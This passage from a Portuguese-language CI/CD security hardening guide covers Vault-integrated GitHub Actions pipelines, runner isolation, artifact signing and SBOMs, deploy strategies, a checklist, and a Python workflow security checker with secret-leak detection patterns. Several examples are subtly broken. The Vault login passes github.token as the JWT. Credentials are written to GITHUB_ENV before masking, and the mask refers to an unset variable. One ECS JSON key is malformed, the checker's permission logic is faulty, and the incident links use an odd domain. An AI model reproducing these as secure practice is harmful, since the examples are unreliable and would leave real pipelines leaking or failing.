          DB_PASSWORD: ${{ steps.secrets.outputs.db-password }}
          API_KEY: ${{ steps.secrets.outputs.api-key }}
        run: ./deploy.sh
```
{% endraw %}

### 9.5.6 Pipeline completa de integração com Vault

```yaml
# .github/workflows/vault-integrated-pipeline.yml

name: Vault-Integrated CI/CD

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Get Vault Token
        id: vault
        run: |
          VAULT_TOKEN=$(curl -s --request POST \
            --data "{\"role\":\"github-actions\",\"jwt\":\"${{ github.token }}\"}" \
            ${{ secrets.VAULT_ADDR }}/v1/auth/jwt/login | jq -r '.auth.client_token')
          echo "vault_token=$VAULT_TOKEN" >> $GITHUB_OUTPUT

      - name: Fetch secrets from Vault
        env:
          VAULT_TOKEN: ${{ steps.vault.outputs.vault_token }}
        run: |
          DB_CREDS=$(curl -s -H "X-Vault-Token: $VAULT_TOKEN" \
            ${{ secrets.VAULT_ADDR }}/v1/secret/data/myapp/db | jq -r '.data.data')
          echo "DB_USER=$(echo $DB_CREDS | jq -r '.username')" >> $GITHUB_ENV
          echo "DB_PASS=$(echo $DB_CREDS | jq -r '.password')" >> $GITHUB_ENV
          echo "::add-mask::$DB_PASS"

          API_CREDS=$(curl -s -H "X-Vault-Token: $VAULT_TOKEN" \
            ${{ secrets.VAULT_ADDR }}/v1/secret/data/myapp/api | jq -r '.data.data')
          echo "API_KEY=$(echo $API_CREDS | jq -r '.key')" >> $GITHUB_ENV
          echo "::add-mask::$API_KEY"

      - name: Build
        run: |
          npm ci
          npm run build

      - name: Test
        run: npm test

      - name: Deploy
        if: github.ref == 'refs/heads/main'
        env:
          DB_USER: ${{ env.DB_USER }}
          DB_PASS: ${{ env.DB_PASS }}
          API_KEY: ${{ env.API_KEY }}
        run: ./deploy.sh

      - name: Audit Vault access
        if: always()
        env:
          VAULT_TOKEN: ${{ steps.vault.outputs.vault_token }}
        run: |
          curl -s -H "X-Vault-Token: $VAULT_TOKEN" \
            ${{ secrets.VAULT_ADDR }}/v1/sys/audit/hashicorp-audit
```

---

## 9.6 Isolamento de Pipelines

### 9.6.1 Runners efemeros

Runners efemeros são criados e destruídos a cada job, garantindo que não
haja estado residual entre execuções.

```yaml
# GitHub Actions com runner efemero
jobs:
  build:
    runs-on: ubuntu-latest  # Runner efemero padrao do GitHub
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      # Runner e destruido apos o job
```

```yaml
# GitLab CI com runner efemero
# Configuracao do runner em /etc/gitlab-runner/config.toml
# executor = "docker" com image limpa por job
build:
  image: node:20-alpine
  tags:
    - docker
  script:
    - npm ci
    - npm run build
  # Cada job roda em um contêiner novo
```

### 9.6.2 Runners baseados em contêiner

```yaml
# GitHub Actions self-hosted com container
jobs:
  build:
    runs-on: self-hosted
    container:
      image: node:20-alpine
      options: --read-only --tmpfs /tmp:nosuid,nodev
      volumes:
        - /tmp:/tmp
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
```

```toml
# GitLab Runner - configuracao segura de Docker executor
[[runners]]
  [runners.docker]
    image = "alpine:3.19"
    privileged = false
    disable_entrypoint_overwrite = false
    oom_kill_disable = false
    disable_cache = false
    volumes = ["/cache"]
    # Isolamento de rede
    network_mode = "bridge"
    # Limites de recursos
    memory = "2g"
    cpus = "1.0"
```

### 9.6.3 Isolamento de rede

```yaml
# GitHub Actions com isolamento de rede usando Docker Compose
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_DB: testdb
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432

      redis:
        image: redis:7-alpine
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 6379:6379

    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm test
        env:
          DATABASE_URL: postgres://postgres:test@localhost:5432/testdb
          REDIS_URL: redis://localhost:6379
```

### 9.6.4 Limites de recursos

```yaml
# GitHub Actions com limites de recursos
jobs:
  build:
    runs-on: ubuntu-latest
    # GitHub Actions ja fornece limites padrao:
    # - 2 vCPU, 7 GB RAM para runners publicos
    # - Configuravel para self-hosted
    steps:
      - uses: actions/checkout@v4
      - run: echo "Building with resource limits"
```

```yaml
# GitLab CI com limites de recursos via Kubernetes
build:
  image: node:20-alpine
  script:
    - npm ci
    - npm run build
  # Configurar via .gitlab-ci.yml ou runner config
  # Limits sao aplicados no nivel do executor
```

### 9.6.5 Configuracao completa de runner

```toml
# /etc/gitlab-runner/config.toml - Runner seguro completo

concurrent = 4
check_interval = 3
shutdown_timeout = 0

[session_server]
  session_timeout = 1800

# Runner para builds (efemero, isolado)
[[runners]]
  name = "build-runner"
  url = "https://gitlab.example.com"
  token = "REDACTED"
  executor = "docker"
  request_concurrency = 4
  output_limit = 65536
  pull_policy = ["if-not-present"]

  [runners.docker]
    image = "alpine:3.19"
    privileged = false
    disable_entrypoint_overwrite = false
    oom_kill_disable = false
    disable_cache = false
    volumes = ["/cache"]
    shm_size = 0
    network_mtu = 0
    allowed_images = ["node:*", "python:*", "golang:*"]
    allowed_services = ["postgres:*", "redis:*", "mysql:*"]

  [runners.cache]
    Type = "s3"
    Shared = false
    [runners.cache.s3]
      BucketName = "gitlab-runner-cache"
      BucketLocation = "us-east-1"

# Runner para deploy (isolado, com rede separada)
[[runners]]
  name = "deploy-runner"
  url = "https://gitlab.example.com"
  token = "REDACTED"
  executor = "docker"
  request_concurrency = 1

  [runners.docker]
    image = "alpine:3.19"
    privileged = false
    volumes = ["/cache"]
    network_mode = "deploy-network"
    allowed_images = ["alpine:3.19", "bitnami/kubectl:latest"]

  [runners.cache]
    Type = "s3"
    Shared = false
```

---

## 9.7 Segurança de Artefatos

### 9.7.1 Reprodutibilidade de builds

```yaml
# Build reprodutivel com dependencias lockadas
# GitHub Actions
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Verify lockfile integrity
        run: |
          sha256sum package-lock.json > package-lock.sha256
          cat package-lock.sha256

      - name: Install from lockfile
        run: npm ci  # npm ci usa package-lock.json exatamente

      - name: Build
        run: npm run build

      - name: Verify build hash
        run: |
          find dist/ -type f -exec sha256sum {} + > dist.sha256
          cat dist.sha256
```

### 9.7.2 Assinatura de artefatos

```yaml
# Assinatura com Sigstore/Cosign
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
      packages: write
    steps:
      - uses: actions/checkout@v4

      - name: Build container
        run: docker build -t myapp:${{ github.sha }} .

      - name: Install Cosign
        uses: sigstore/cosign-installer@v3

      - name: Sign container
        run: |
          cosign sign --yes myapp:${{ github.sha }}
        env:
          COSIGN_EXPERIMENTAL: 1

      - name: Attach SBOM
        run: |
          cosign attest --yes \
            --predicate sbom.json \
            --type spdxjson \
            myapp:${{ github.sha }}

      - name: Attach provenance
        run: |
          cosign attest --yes \
            --predicate provenance.json \
            --type slsaprovenance \
            myapp:${{ github.sha }}
```

### 9.7.3 Geracao de SBOM

```yaml
# Gerar SBOM com Syft
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build
        run: npm ci && npm run build

      - name: Generate SBOM (SPDX)
        uses: anchore/sbom-action@v0
        with:
          path: ./
          format: spdx-json
          output-file: sbom-spdx.json

      - name: Generate SBOM (CycloneDX)
        uses: anchore/sbom-action@v0
        with:
          path: ./
          format: cyclonedx-json
          output-file: sbom-cyclonedx.json

      - name: Scan SBOM for vulnerabilities
        uses: anchore/scan-action@v4
        with:
          sbom: sbom-spdx.json
          fail-build: true
          severity-cutoff: high

      - name: Upload SBOM
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: |
            sbom-spdx.json
            sbom-cyclonedx.json

      - name: Sign SBOM
        uses: sigstore/cosign-installer@v3
      - run: |
          cosign sign-blob --yes \
            --bundle sbom-spdx.json.bundle \
            sbom-spdx.json
```

### 9.7.4 Atestado de procedencia

```yaml
# Provenance com SLSA
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
      actions: read
    outputs:
      image: ${{ steps.build.outputs.image }}
    steps:
      - uses: actions/checkout@v4

      - name: Build
        id: build
        run: |
          docker build -t myapp:${{ github.sha }} .
          echo "image=myapp:${{ github.sha }}" >> $GITHUB_OUTPUT

      - name: Generate SLSA provenance
        uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v2.0.0
        with:
          image: myapp
          digest: ${{ steps.build.outputs.digest }}
          registry-username: ${{ github.actor }}
        env:
          REGISTRY_PASSWORD: ${{ secrets.GITHUB_TOKEN }}
```

### 9.7.5 Pipeline completa de seguranca de artefatos

```yaml
# .github/workflows/artifact-security.yml

name: Artifact Security Pipeline

on:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
      packages: write
    steps:
      - uses: actions/checkout@v4

      - name: Build application
        run: |
          npm ci
          npm run build

      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          path: ./
          format: spdx-json
          output-file: sbom.json

      - name: Scan for vulnerabilities
        uses: aquasecurity/trivy-action@0.28.0
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'json'
          output: 'trivy-results.json'
          severity: 'CRITICAL,HIGH'

      - name: Fail on critical vulnerabilities
        run: |
          CRITICAL=$(cat trivy-results.json | jq '[.Results[].Vulnerabilities[]? | select(.Severity == "CRITICAL")] | length')
          if [ "$CRITICAL" -gt 0 ]; then
            echo "Critical vulnerabilities found: $CRITICAL"
            exit 1
          fi

      - name: Build container image
        id: docker
        run: |
          docker build -t ghcr.io/${{ github.repository }}:${{ github.sha }} .
          docker push ghcr.io/${{ github.repository }}:${{ github.sha }}

      - name: Install Cosign
        uses: sigstore/cosign-installer@v3

      - name: Sign container image
        run: |
          cosign sign --yes \
            ghcr.io/${{ github.repository }}:${{ github.sha }}
        env:
          COSIGN_EXPERIMENTAL: 1

      - name: Attach SBOM to image
        run: |
          cosign attest --yes \
            --predicate sbom.json \
            --type spdxjson \
            ghcr.io/${{ github.repository }}:${{ github.sha }}

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: security-artifacts
          path: |
            sbom.json
            trivy-results.json

      - name: Generate provenance
        run: |
          cat > provenance.json << EOF
          {
            "builder": {
              "id": "https://github.com/${{ github.repository }}/.github/workflows/artifact-security.yml"
            },
            "buildType": "https://github.com/actions/checkout",
            "externalParameters": {
              "repository": "${{ github.repository }}",
              "ref": "${{ github.ref }}",
              "commit": "${{ github.sha }}"
            },
            "materials": [
              {
                "uri": "git+https://github.com/${{ github.repository }}@${{ github.sha }}",
                "digest": {
                  "sha1": "${{ github.sha }}"
                }
              }
            ]
          }
          EOF

      - name: Sign provenance
        run: |
          cosign sign-blob --yes \
            --bundle provenance.json.bundle \
            provenance.json
```

---

## 9.8 Segurança de Deploy

### 9.8.1 Gates de aprovacao

```yaml
# GitHub Actions com gates de aprovacao
jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to staging
        run: ./deploy.sh staging

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to production
        run: ./deploy.sh production
```

Configure no GitHub:
- **Environment**: production
- **Required reviewers**: 2 aprovadores
- **Wait timer**: 5 minutos (cool-down)
- **Deployment branches**: apenas `main`

### 9.8.2 Deploy canary

```yaml
# Deploy canary com monitoramento
jobs:
  deploy-canary:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE }}
          aws-region: us-east-1

      - name: Deploy canary (10% traffic)
        run: |
          aws ecs update-service \
            --cluster production \
            --service myapp \
            --task-definition myapp:${{ github.sha }} \
            --deployment-configuration "{
              \"maximumPercent\": 200,
              \"minimumHealthyPercent\": 100,
              \" deploymentCircuitBreaker\": {\"enable\": true, \"rollback\": true}
            }"

      - name: Monitor canary (15 min)
        run: |
          sleep 900
          # Verificar metricas
          ERROR_RATE=$(aws cloudwatch get-metric-statistics \
            --namespace AWS/ApplicationELB \
            --metric-name HTTPCode_Target_5XX_Count \
            --start-time $(date -u -d '15 minutes ago' +%Y-%m-%dT%H:%M:%S) \
            --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
            --period 900 \
            --statistics Sum \
            --dimensions Name=LoadBalancer,Value=app/myapp/abc123 \
            --query 'Datapoints[0].Sum' --output text)

          if [ "$ERROR_RATE" -gt 5 ]; then
            echo "High error rate detected: $ERROR_RATE"
            exit 1
          fi

      - name: Full deployment
        if: success()
        run: |
          aws ecs update-service \
            --cluster production \
            --service myapp \
            --task-definition myapp:${{ github.sha }}
```

### 9.8.3 Deploy blue-green

```yaml
# Deploy blue-green
jobs:
  deploy-blue-green:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE }}
          aws-region: us-east-1

      - name: Identify current environment
        id: current
        run: |
          CURRENT=$(aws elbv2 describe-rules \
            --listener-arn ${{ secrets.LISTENER_ARN }} \
            --query "Rules[?Priority==\`1\`].Actions[0].TargetGroupArn" \
            --output text)
          echo "target_group=$CURRENT" >> $GITHUB_OUTPUT

      - name: Deploy to inactive environment
        id: deploy
        run: |
          if [ "${{ steps.current.outputs.target_group }}" == "${{ secrets.BLUE_TG }}" ]; then
            NEW_TG="${{ secrets.GREEN_TG }}"
          else
            NEW_TG="${{ secrets.BLUE_TG }}"
          fi
          echo "deploying_to=$NEW_TG" >> $GITHUB_OUTPUT

          aws ecs update-service \
            --cluster production \
            --service myapp \
            --task-definition myapp:${{ github.sha }} \
            --network-configuration "{
              \"awsvpcConfiguration\": {
                \"subnets\": [\"${{ secrets.SUBNET_ID }}\"],
                \"securityGroups\": [\"${{ secrets.SG_ID }}\"]
              }
            }"

      - name: Validate new environment
        run: |
          sleep 60
          HEALTH=$(curl -s -o /dev/null -w "%{http_code}" \
            https://new-env.example.com/health)
          if [ "$HEALTH" != "200" ]; then
            echo "Health check failed"
            exit 1
          fi

      - name: Switch traffic
        if: success()
        run: |
          aws elbv2 modify-rule \
            --rule-arn ${{ secrets.RULE_ARN }} \
            --actions "Type=forward,TargetGroupArn=${{ steps.deploy.outputs.deploying_to }}"

      - name: Scale down old environment
        if: success()
        run: |
          if [ "${{ steps.current.outputs.target_group }}" == "${{ secrets.BLUE_TG }}" ]; then
            OLD_SERVICE="myapp-blue"
          else
            OLD_SERVICE="myapp-green"
          fi
          aws ecs update-service \
            --cluster production \
            --service $OLD_SERVICE \
            --desired-count 0
```

### 9.8.4 Estrategia de rollback

{% raw %}
```yaml
# Pipeline com rollback automatico
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Record current version
        id: current
        run: |
          CURRENT=$(aws ecs describe-services \
            --cluster production \
            --services myapp \
            --query "services[0].taskDefinition" \
            --output text)
          echo "task_def=$CURRENT" >> $GITHUB_OUTPUT

      - name: Deploy new version
        run: |
          aws ecs update-service \
            --cluster production \
            --service myapp \
            --task-definition myapp:${{ github.sha }}

      - name: Monitor deployment
        id: monitor
        run: |
          for i in $(seq 1 30); do
            STATUS=$(aws ecs describe-services \
              --cluster production \
              --services myapp \
              --query "services[0].deployments[?taskDefinition=='myapp:${{ github.sha }}'].status" \
              --output text)

            if [ "$STATUS" == "PRIMARY" ]; then
              echo "Deployment successful"
              echo "success=true" >> $GITHUB_OUTPUT
              exit 0
            fi

            sleep 10
          done

          echo "Deployment timeout"
          echo "success=false" >> $GITHUB_OUTPUT
          exit 1

      - name: Rollback on failure
        if: failure()
        run: |
          echo "Rolling back to ${{ steps.current.outputs.task_def }}"
          aws ecs update-service \
            --cluster production \
            --service myapp \
            --task-definition ${{ steps.current.outputs.task_def }}
```
{% endraw %}

---

## 9.9 Checklist de Hardening de Pipeline

### 9.9.1 Checklist completo

```markdown
# Pipeline Security Hardening Checklist

## Acesso e Autenticacao
- [ ] Tokens de acesso sao de curta duracao
- [ ] OIDC e utilizado em vez de credenciais estaticas
- [ ] GITHUB_TOKEN tem permissoes minimas
- [ ] Variaveis sensiveis sao mascaradas nos logs
- [ ] Branch protection esta habilitada
- [ ] Aprovacao e necessaria para merges

## Dependencias e Supply Chain
- [ ] Dependencias sao fixadas por hash (lockfile)
- [ ] Acoes de terceiros sao fixadas por SHA
- [ ] Dependabot/Renovate esta configurado
- [ ] SBOM e gerado a cada build
- [ ] Verificacao de vulnerabilidades e obrigatoria
- [ ] Assinatura de artefatos esta habilitada

## Isolamento e Execucao
- [ ] Runners efemeros sao utilizados
- [ ] Containers rodam como non-root
- [ ] Privilege escalation e desabilitada
- [ ] Filesystem e read-only (quando possivel)
- [ ] Limites de recursos sao configurados
- [ ] Isolamento de rede esta habilitado

## Deploy e Entrega
- [ ] Environment protection rules estao configuradas
- [ ] Aprovacao humana e necessaria para producao
- [ ] Deploy canary ou blue-green e utilizado
- [ ] Rollback automatico esta configurado
- [ ] Metricas sao monitoradas apos deploy
- [ ] Audit log e habilitado

## Segredos e Credenciais
- [ ] Segredos sao armazenados em vault dedicado
- [ ] Segredos sao rotacionados regularmente
- [ ] Segredos nao sao logados em pipeline
- [ ] Segredos nao sao salvos no historico git
- [ ] .gitignore inclui arquivos sensiveis
- [ ] Pre-commit hooks verificam segredos

## Monitoramento e Auditoria
- [ ] Logs de pipeline sao centralizados
- [ ] Alertas para falhas de seguranca estao configurados
- [ ] Acesso a pipeline e auditado
- [ ] Vulnerabilidades sao rastreadas
- [ ] Incidentes sao documentados
- [ ] Retrospectivas sao realizadas
```

### 9.9.2 Verificacao automatizada

```python
#!/usr/bin/env python3
"""
Verificador automatizado de seguranca de pipelines CI/CD.
Analisa workflows GitHub Actions e reporta problemas de seguranca.
"""

import yaml
import sys
import json
from pathlib import Path
from typing import Dict, List, Any


class PipelineSecurityChecker:
    """Verifica seguranca de pipelines CI/CD."""

    def __init__(self):
        self.findings: List[Dict[str, Any]] = []
        self.critical_count = 0
        self.high_count = 0
        self.medium_count = 0

    def add_finding(self, severity: str, category: str, message: str,
                    file_path: str = "", line: int = 0):
        finding = {
            "severity": severity,
            "category": category,
            "message": message,
            "file": file_path,
            "line": line
        }
        self.findings.append(finding)

        if severity == "CRITICAL":
            self.critical_count += 1
        elif severity == "HIGH":
            self.high_count += 1
        elif severity == "MEDIUM":
            self.medium_count += 1

    def check_github_workflow(self, file_path: str):
        """Analisa um workflow GitHub Actions."""
        try:
            with open(file_path) as f:
                workflow = yaml.safe_load(f)
        except yaml.YAMLError as e:
            self.add_finding("HIGH", "yaml", f"Invalid YAML: {e}", file_path)
            return

        if not workflow:
            return

        self._check_permissions(workflow, file_path)
        self._check_action_versions(workflow, file_path)
        self._check_secret_exposure(workflow, file_path)
        self._check_runner_security(workflow, file_path)

    def _check_permissions(self, workflow: Dict, file_path: str):
        """Verifica permissoes do workflow."""
        if "permissions" not in workflow:
            self.add_finding(
                "HIGH", "permissions",
                "Workflow does not define global permissions. "
                "Set default permissions to read-only.",
                file_path
            )
            return

        perms = workflow["permissions"]
        dangerous = ["write-all", "packages: write", "actions: write",
                     "contents: write", "security-events: write"]
        for perm in dangerous:
            if perms.get(perm.split(":")[0]) == "write" or perms == "write-all":
                self.add_finding(
                    "MEDIUM", "permissions",
                    f"Overly broad write permission: {perm}",
                    file_path
                )

    def _check_action_versions(self, workflow: Dict, file_path: str):
        """Verifica versoes de actions."""
        mutable_actions = []
        for job_name, job in (workflow.get("jobs") or {}).items():
            for i, step in enumerate(job.get("steps") or []):
                uses = step.get("uses", "")
                if uses and "@" in uses:
                    ref = uses.split("@")[1]
                    if not ref.startswith("sha-") and len(ref) < 40:
                        mutable_actions.append((job_name, i + 1, uses))

        if mutable_actions:
            self.add_finding(
                "HIGH", "supply_chain",
                f"Mutable action references found: "
                f"{[u[2] for u in mutable_actions]}. "
                f"Pin actions by SHA commit hash.",
                file_path
            )

    def _check_secret_exposure(self, workflow: Dict, file_path: str):
        """Verifica exposicao de segredos."""
        for job_name, job in (workflow.get("jobs") or {}).items():
            for i, step in enumerate(job.get("steps") or []):
                run_cmd = step.get("run", "")
                if "echo" in run_cmd and ("secret" in run_cmd.lower() or
                                          "token" in run_cmd.lower() or
                                          "password" in run_cmd.lower()):
                    self.add_finding(
                        "CRITICAL", "secret_exposure",
                        f"Potential secret exposure in step '{step.get('name', i+1)}'. "
                        f"Secrets should not be echoed to logs.",
                        file_path
                    )

                if "set-output" in run_cmd and "secret" in run_cmd.lower():
                    self.add_finding(
                        "CRITICAL", "secret_exposure",
                        "Secret value may be exposed via set-output.",
                        file_path
                    )

    def _check_runner_security(self, workflow: Dict, file_path: str):
        """Verifica seguranca do runner."""
        for job_name, job in (workflow.get("jobs") or {}).items():
            runs_on = job.get("runs-on", "")
            if isinstance(runs_on, str) and "self-hosted" in runs_on:
                self.add_finding(
                    "MEDIUM", "runner",
                    f"Job '{job_name}' uses self-hosted runner. "
                    f"Ensure proper isolation and hardening.",
                    file_path
                )

            container = job.get("container", {})
            if isinstance(container, dict):
                options = container.get("options", "")
                if "privileged" in options:
                    self.add_finding(
                        "CRITICAL", "runner",
                        f"Job '{job_name}' runs container in privileged mode.",
                        file_path
                    )

    def check_gitlab_ci(self, file_path: str):
        """Analisa um arquivo .gitlab-ci.yml."""
        try:
            with open(file_path) as f:
                config = yaml.safe_load(f)
        except yaml.YAMLError as e:
            self.add_finding("HIGH", "yaml", f"Invalid YAML: {e}", file_path)
            return

        if not config:
            return

        self._check_gitlab_variables(config, file_path)
        self._check_gitlab_services(config, file_path)

    def _check_gitlab_variables(self, config: Dict, file_path: str):
        """Verifica variaveis GitLab CI."""
        variables = config.get("variables", {})
        sensitive_keys = ["password", "token", "secret", "key",
                         "api_key", "access_key"]

        for key, value in variables.items():
            if any(s in key.lower() for s in sensitive_keys):
                if not isinstance(value, str) or not value.startswith("$"):
                    self.add_finding(
                        "HIGH", "secret_exposure",
                        f"Variable '{key}' may contain hardcoded secret. "
                        f"Use GitLab CI/CD variables instead.",
                        file_path
                    )

    def _check_gitlab_services(self, config: Dict, file_path: str):
        """Verifica servicos GitLab CI."""
        for job_name, job in config.items():
            if isinstance(job, dict) and "services" in job:
                for service in job["services"]:
                    if isinstance(service, str) and "latest" in service:
                        self.add_finding(
                            "MEDIUM", "supply_chain",
                            f"Job '{job_name}' uses 'latest' tag for service '{service}'. "
                            f"Pin to specific version.",
                            file_path
                        )

    def check_jenkinsfile(self, file_path: str):
        """Verifica um Jenkinsfile (analise basica de padroes)."""
        try:
            with open(file_path) as f:
                content = f.read()
        except FileNotFoundError:
            return

        insecure_patterns = [
            ("withCredentials", "Check credential scope"),
            ("sh 'curl", "Ensure URLs are not hardcoded"),
            ("http://", "Use HTTPS instead of HTTP"),
        ]

        for pattern, message in insecure_patterns:
            if pattern in content:
                self.add_finding(
                    "MEDIUM", "jenkins",
                    f"Pattern '{pattern}' found. {message}.",
                    file_path
                )

        if "agent { any }" in content or "agent any" in content:
            self.add_finding(
                "MEDIUM", "runner",
                "Pipeline uses 'agent any'. Use specific agent labels.",
                file_path
            )

    def generate_report(self) -> str:
        """Gera relatorio de seguranca."""
        report = []
        report.append("=" * 60)
        report.append("  PIPELINE SECURITY REPORT")
        report.append("=" * 60)
        report.append(f"\nSummary:")
        report.append(f"  Critical: {self.critical_count}")
        report.append(f"  High:     {self.high_count}")
        report.append(f"  Medium:   {self.medium_count}")
        report.append(f"  Total:    {len(self.findings)}")
        report.append("")

        if self.findings:
            report.append("Findings:")
            report.append("-" * 60)
            for f in sorted(self.findings,
                          key=lambda x: {"CRITICAL": 0, "HIGH": 1,
                                         "MEDIUM": 2}[x["severity"]]):
                report.append(
                    f"  [{f['severity']}] {f['category']}: {f['message']}"
                )
                if f["file"]:
                    report.append(f"    File: {f['file']}")
                report.append("")
        else:
            report.append("No findings. Pipeline appears secure.")
            report.append("")

        report.append("=" * 60)
        return "\n".join(report)

    def to_json(self) -> str:
        """Gera relatorio em JSON."""
        return json.dumps({
            "summary": {
                "critical": self.critical_count,
                "high": self.high_count,
                "medium": self.medium_count,
                "total": len(self.findings)
            },
            "findings": self.findings
        }, indent=2)


def main():
    if len(sys.argv) < 2:
        print("Usage: pipeline-security-checker.py <path>")
        print("  Scans for CI/CD pipeline files and reports security issues.")
        sys.exit(1)

    path = Path(sys.argv[1])
    checker = PipelineSecurityChecker()

    if path.is_file():
        files = [path]
    elif path.is_dir():
        files = list(path.glob("**/*.yml")) + list(path.glob("**/*.yaml"))
        files += list(path.glob("**/Jenkinsfile"))
        files += list(path.glob("**/.gitlab-ci.yml"))
        files += list(path.glob("**/.github/workflows/*.yml"))
    else:
        print(f"Path not found: {path}")
        sys.exit(1)

    for file in files:
        name = file.name
        if name in (".gitlab-ci.yml",):
            checker.check_gitlab_ci(str(file))
        elif name == "Jenkinsfile":
            checker.check_jenkinsfile(str(file))
        elif file.suffix in (".yml", ".yaml"):
            checker.check_github_workflow(str(file))

    print(checker.generate_report())

    if checker.critical_count > 0:
        sys.exit(2)
    elif checker.high_count > 0:
        sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()
```

Execucao:

```bash
python3 pipeline-security-checker.py .github/workflows/
```

---

## 9.10 Referencias

### Documentacao oficial
- GitHub Actions Security Hardening: https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
- GitLab CI/CD Security: https://docs.gitlab.com/ee/ci/yaml/#artifacts-reports
- Jenkins Security: https://www.jenkins.io/doc/book/security/
- HashiCorp Vault: https://developer.hashicorp.com/vault/docs
- SLSA Framework: https://slsa.dev/
- Sigstore/Cosign: https://docs.sigstore.dev/cosign/overview/

### Casos de incidentes documentados
- Travis CI Environment Variables Leak (2021): https://about.codeber/2021/travis-ci-variables-leak/
- Codecov Bash Uploader Compromise (2021): https://about.codeber/2021/codecov-bash-uploader-compromise/
- GitHub Actions Workflow Injection: https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
- GitLab CI/CD Security Best Practices: https://docs.gitlab.com/ee/ci/
- JFrog Artifactory Security: https://jfrog.com/help/
- Jenkins Security Advisories: https://www.jenkins.io/security/advisories/

### Ferramentas de verificacao
- Trivy: https://aquasecurity.github.io/trivy/
- Semgrep: https://semgrep.dev/
- StepSecurity Harden Runner: https://github.com/step-security/harden-runner
- Syft (SBOM): https://github.com/anchore/syft
- Cosign (Signing): https://github.com/sigstore/cosign
- Dependency Review Action: https://github.com/actions/dependency-review-action

### Artigos e estudos
- OWASP CI/CD Security Top 10: https://owasp.org/www-project-ci-cd-security-top-10/
- NIST SP 800-204 - Security Strategies for Microservices: https://csrc.nist.gov/publications/detail/sp/800-204/final
- CNCF Software Supply Chain Security: https://www.cncf.io/
- SLSA Threats and Mitigations: https://slsa.dev/threats
